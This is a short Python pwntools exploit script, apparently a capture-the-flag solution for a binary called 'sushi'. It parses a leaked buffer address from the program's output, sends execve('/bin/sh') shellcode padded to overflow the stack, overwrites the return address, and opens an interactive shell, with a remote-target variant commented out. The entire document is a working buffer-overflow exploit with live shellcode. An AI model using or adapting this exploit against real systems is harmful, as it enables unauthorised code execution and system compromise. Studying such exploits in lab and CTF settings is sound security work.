from pwn import *
import re, sys
pname = './sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8'
# shellcode from http://shell-storm.org/shellcode/files/shellcode-806.php
sh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 
p = process(pname)
#H,P='localhost',6666
#p = remote(H,P)
out = p.recvuntil('\n')
res = re.findall('Deposit money for sushi here: (.*)', out)
if len(res) < 1:
    print "Something is wrong with your program", pname
    sys.exit(1)
bufaddr = p64(long(res[0],16))
p.sendline(sh.ljust(0x48, "A")+bufaddr)
p.interactive()
